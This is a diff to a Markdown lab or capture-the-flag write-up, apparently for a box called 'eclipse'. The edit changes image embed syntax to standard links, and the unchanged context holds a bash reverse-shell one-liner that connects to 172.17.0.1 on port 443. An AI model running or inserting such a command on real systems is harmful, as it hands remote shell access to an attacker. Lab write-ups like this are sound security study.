@@ -1,20 +1,20 @@
-![[Pasted image 20250318212605.png]]
+![](images/images-eclipse/Pasted%20image%2020250318212605.png)
 
-![[Pasted image 20250318212819.png]]
+![](images/images-eclipse/Pasted%20image%2020250318212819.png)
 
-![[Pasted image 20250318212838.png]]
+![](images/images-eclipse/Pasted%20image%2020250318212838.png)
 
-![[Pasted image 20250318213712.png]]
+![](images/images-eclipse/Pasted%20image%2020250318213712.png)
 
-![[Pasted image 20250318214422.png]]
+![](images/images-eclipse/Pasted%20image%2020250318214422.png)
 
-![[Pasted image 20250318214934.png]]
+![](images/images-eclipse/Pasted%20image%2020250318214934.png)
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```
 
-![[Pasted image 20250318215349.png]]
+![](images/images-eclipse/Pasted%20image%2020250318215349.png)
 
 
 Sanitizacion de la shell (TTY):
